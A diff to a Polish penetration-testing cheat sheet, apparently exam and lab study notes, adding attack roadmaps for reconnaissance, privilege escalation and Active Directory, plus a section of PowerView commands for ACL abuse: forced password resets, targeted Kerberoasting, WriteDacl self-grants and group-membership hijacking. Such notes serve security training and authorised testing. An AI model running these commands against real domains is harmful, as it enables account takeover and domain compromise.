@@ -57,6 +57,9 @@ sudo nmap --privileged -p- -sV -sC -T4 -v -oN nmap_full.txt $IP
 > Cel fazy: zmapować powierzchnię ataku — otwarte porty, usługi, wersje, domeny, share'y, użytkownicy.
 > **Zasada:** enumerate → enumerate → enumerate. 90% pracy to rozpoznanie.
 
+> 🎯 **Drogowskaz — co po kolei:** 1) szybki ping-sweep (§1.1) → lista żywych hostów. 2) nmap `-sС -sV` na każdym (§1.2) → usługi+wersje. 3) każdy port ma swój tor: 80/443→web (§1.3), 445→SMB (§1.5), 389→LDAP (§1.7), 88→Kerberos/AD (§1.8), 161→SNMP (§1.6). 4) pełny `-p-` w tle, gdy grzebiesz w tym co znalazłeś.
+> 💎 **Co wartościowe:** wersje usług (→ searchsploit) · anonymous/guest na SMB/FTP · `description` w LDAP · listę userów (→ spraying/AS-REP) · transfer strefy DNS · nietypowe wysokie porty.
+
 ## 1.1 Host discovery (co żyje w sieci?)
 
 Sweep po zakresie IP (reverse DNS):
@@ -896,6 +899,10 @@ findstr /si password *.txt *.ini *.config *.xml
 > Cel fazy: z usera → root/SYSTEM. Najpierw automat (linpeas/winpeas), potem ręczna weryfikacja tropów.
 > 🔗 **GTFOBins** (Linux): https://gtfobins.github.io  |  **LOLBAS** (Windows): https://lolbas-project.github.io
 
+> 🎯 **Drogowskaz — Linux:** `sudo -l` (§4.1) → `id`/grupy → SUID (`find / -perm -4000`) → capabilities → cron zapisywalny → kernel (`uname -r`). Każdy trop sprawdź na GTFOBins.
+> 🎯 **Drogowskaz — Windows:** `whoami /priv` (§4.2, szukaj SeImpersonate→potato) → usługi (unquoted/słabe ACL) → zapisane creds (`cmdkey /list`, historia PS, unattend/GPP) → AlwaysInstallElevated → auto-logon w rejestrze.
+> 💎 **Co wartościowe:** hasła w plikach/historii/configu · reużywalne creds z usług · zapisywalny plik uruchamiany przez root/SYSTEM · token z przywilejem impersonacji.
+
 ## 4.1 Linux privesc
 
 ### SUID / SGID binaries
@@ -1262,6 +1269,15 @@ mimikatz # kerberos::golden /user:jeffadmin /domain:corp.com /sid:S-1-5-21-19873
 > 🔗 Setup BloodHound graph: https://happycamper84.medium.com/howto-setup-bloodhound-map-ad-44c7149ba28b
 > 🔗 PowerSploit/PowerView: https://github.com/PowerShellMafia/PowerSploit
 
+> 🎯 **Drogowskaz — co po kolei robić w AD (z hosta domenowego):**
+> 1. **Poznaj siebie** — swój SID + WSZYSTKIE grupy (też zagnieżdżone). Prawa często wisi na grupie, nie na Tobie. `whoami /groups`, `Get-DomainGroup -MemberIdentity <ja>`.
+> 2. **Zmapuj domenę** — userzy, grupy, komputery, SPN-y, polityka haseł (§6.2). Cel: lista kont + gdzie co stoi.
+> 3. **Szukaj szybkich winów** — AS-REP (§1.8), Kerberoast (§5.3), hasła w `description`, `Find-LocalAdminAccess`, `Find-DomainShare -CheckShareAccess`.
+> 4. **ACL abuse** (§6.5) — kto ma potężne prawo nad kim (`Find-InterestingDomainAcl`). Znajdź GenericAll/WriteDacl/ForceChangePassword → przejmij konto → **powtórz enumerację z nowego kontekstu**. To pętla, nie jeden strzał.
+> 5. **Eskaluj do domeny** — gdy dojdziesz do DA/DCSync → NTDS.dit, Golden/Silver Ticket (§5.6).
+>
+> 💎 **Co jest wartościowe (na co polować):** konta z SPN (Kerberoast) · konta `DONT_REQ_PREAUTH` (AS-REP) · hasła w `description`/`info`/GPP · prawa ACL (GenericAll/WriteDacl/GenericWrite/ForceChangePassword) · local admin (`Find-LocalAdminAccess`) · sesje adminów (`Get-NetSession`) · share'y z zapisem/creds (`-CheckShareAccess`) · grupy z „Admin" w nazwie · zagnieżdżenia grup (członek grupy A, która jest w uprzywilejowanej B).
+
 ## 6.1 Zbieranie danych — SharpHound / BloodHound
 
 **SharpHound.exe** — kolektor na hoście domenowym (Windows):
@@ -1356,12 +1372,12 @@ Get-NetGroup "Domain Admins" | select member       # członkowie grupy
 Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion   # hosty + OS
 Find-LocalAdminAccess                              # gdzie jestem lokalnym adminem
 Get-NetSession -ComputerName files04               # kto ma sesję na hoscie (namierz adminów)
-Find-DomainShare                                   # share'y widoczne w domenie
-Get-ObjectAcl -Identity stephanie                  # ACL obiektu (kto ma nad nim prawa)
-Find-InterestingDomainAcl -ResolveGUIDs            # ciekawe prawa (GenericAll/WriteDacl...)
+Find-DomainShare -CheckShareAccess                 # share'y, do KTÓRYCH mam dostęp (bez flagi = wszystkie)
+Get-ObjectAcl -Identity stephanie                  # ACL obiektu (kto ma nad nim prawa); nowsza nazwa: Get-DomainObjectAcl
+Find-InterestingDomainAcl -ResolveGUIDs            # ciekawe prawa (GenericAll/WriteDacl...) w całej domenie
 Invoke-Kerberoast                                  # od razu wyciąga hashe TGS-REP
 ```
-> `Get-NetSession` + `Find-LocalAdminAccess` = mapowanie ścieżek lateral movement bez BloodHound. `Get-ObjectAcl` + `Find-InterestingDomainAcl` = szukanie ścieżek ACL-owych (masz np. WriteDacl nad kontem admina → przejmujesz je).
+> `Get-NetSession` + `Find-LocalAdminAccess` = mapowanie ścieżek lateral movement bez BloodHound. `Get-ObjectAcl` + `Find-InterestingDomainAcl` = szukanie ścieżek ACL-owych (masz np. WriteDacl nad kontem admina → przejmujesz je). **Pełny łańcuch ACL abuse → §6.5.**
 
 ### D. Moduł ActiveDirectory (natywny, „czysty”)
 ```powershell
@@ -1404,6 +1420,73 @@ wmic service get Name,StartName
 ```bash
 impacket-mssqlclient Administrator:Lab123@$IP -windows-auth
 ```
+
+## 6.5 ACL abuse — przejęcie konta przez uprawnienia obiektu
+
+> Jedna z najczęstszych ścieżek w AD: Twoje konto (albo grupa, w której jesteś) ma **potężne prawo nad innym obiektem**. To pętla: *enumeruj prawa → nadużyj → zaloguj się jako ofiara → enumeruj ponownie z jej kontekstu → …* aż dojdziesz do celu/flagi.
+
+### Prawa, które dają przejęcie
+| Prawo (ActiveDirectoryRights / ACE) | Co pozwala | Nadużycie |
+|---|---|---|
+| **GenericAll** | pełna kontrola | reset hasła / dodanie SPN / wszystko |
+| **User-Force-Change-Password** | wymuś zmianę hasła | `Set-DomainUserPassword` |
+| **GenericWrite / WriteProperty** | zapis atrybutów | targeted Kerberoast (ustaw SPN) lub logon script |
+| **WriteDacl** | zapis ACL | dopisz sobie GenericAll → reset |
+| **WriteOwner** | zmiana właściciela | zostań ownerem → WriteDacl → GenericAll |
+| **AddMember (nad grupą)** | zapis `member` | dodaj się do uprzywilejowanej grupy |
+
+### Krok 1 — enumeracja ACL (poprawnie: OBA wymiary)
+> ⚠️ Najczęstszy błąd: filtrowanie tylko po SID usera i tylko po obiektach-userach → fałszywe „nic tu nie ma". Prawa wisi na **grupach** i nad **grupami/komputerami**.
+```powershell
+# principal = mój SID + SID-y WSZYSTKICH moich grup (też zagnieżdżone)
+$sids  = @()
+$sids += (Get-DomainUser  -Identity <ja>).objectsid
+$sids += (Get-DomainGroup -MemberIdentity <ja>).objectsid
+
+# cel = WSZYSTKIE obiekty (users, groups, computers), nie tylko userzy
+Get-DomainObjectAcl -Identity * -ResolveGUIDs |
+  ? { $sids -contains $_.SecurityIdentifier } |
+  select ObjectDN, ActiveDirectoryRights, ObjectAceType, SecurityIdentifier
+```
+Alternatywa szybka: `Find-InterestingDomainAcl -ResolveGUIDs | ? { $_.IdentityReferenceName -eq '<ja>' }`
+
+**Jak czytać wynik:** `SecurityIdentifier`/`IdentityReferenceName` = kto ma prawo (Twój SID/grupa) · `ObjectDN` = nad kim · `ActiveDirectoryRights` = jakie prawo · `ObjectAceType` (dzięki `-ResolveGUIDs`) = np. `User-Force-Change-Password`. `AccessMask 983551` = pełny GenericAll.
+
+### Krok 2 — nadużycie (dobierz do prawa)
+```powershell
+# GenericAll / ForceChangePassword → reset hasła ofiary (nie musisz znać starego):
+$np = ConvertTo-SecureString 'Passw0rd!2024' -AsPlainText -Force
+Set-DomainUserPassword -Identity <ofiara> -AccountPassword $np -Verbose
+
+# GenericWrite → targeted Kerberoast (nie psujesz konta — czystsze niż reset):
+Set-DomainObject -Identity <ofiara> -Set @{serviceprincipalname='fake/svc'} -Verbose
+Get-DomainSPNTicket -Identity <ofiara>          # hash TGS-REP → hashcat -m 13100 (offline)
+Set-DomainObject -Identity <ofiara> -Clear serviceprincipalname   # POSPRZĄTAJ
+
+# WriteDacl → dopisz sobie GenericAll, potem reset jak wyżej:
+Add-DomainObjectAcl -TargetIdentity <ofiara> -PrincipalIdentity <ja> -Rights All -Verbose
+
+# AddMember nad grupą → dodaj się do niej (aktywuje prawa grupy):
+Add-DomainGroupMember -Identity '<Grupa>' -Members <ja> -Verbose
+```
+
+### Krok 3 — zaloguj się jako ofiara
+```cmd
+runas /user:<DOMENA>\<ofiara> powershell        :: na hoście, w kontekście ofiary
+```
+Z Kali: `xfreerdp /u:<ofiara> /p:'Passw0rd!2024' /v:<host>`  albo  `evil-winrm -i <IP> -u <ofiara> -p 'Passw0rd!2024'`. Weryfikacja: `whoami ; whoami /groups`.
+
+### Krok 4 — enumeruj ponownie z kontekstu ofiary → flaga / kolejny skok
+```powershell
+$sid2 = (Get-DomainUser -Identity <ofiara>).objectsid
+Get-DomainObjectAcl -Identity * -ResolveGUIDs | ? { $_.SecurityIdentifier -eq $sid2 } |
+  select ObjectDN, ActiveDirectoryRights, ObjectAceType
+Find-LocalAdminAccess ; Find-DomainShare -CheckShareAccess    # nowy dostęp dopiero jako ofiara
+Get-DomainUser -Identity <ofiara> -Properties description,info,memberof   # flaga bywa w description
+```
+Jeśli ofiara ma prawo nad kolejnym obiektem → powtórz Krok 1–4. Jeśli to koniec łańcucha → flaga zwykle w `description`/`info`, na pulpicie ofiary, albo na share dostępnym z jej konta.
+
+> ⚠️ **Tradecraft:** reset hasła jest destrukcyjny (blokuje prawdziwego usera) — w labie OK, w realnym teście wybieraj Kerberoast/SPN gdy masz GenericWrite i ZAWSZE sprzątaj dopisane SPN-y/ACL-e/członkostwa. Odnotuj każdą zmianę do raportu.
 
 ---
 
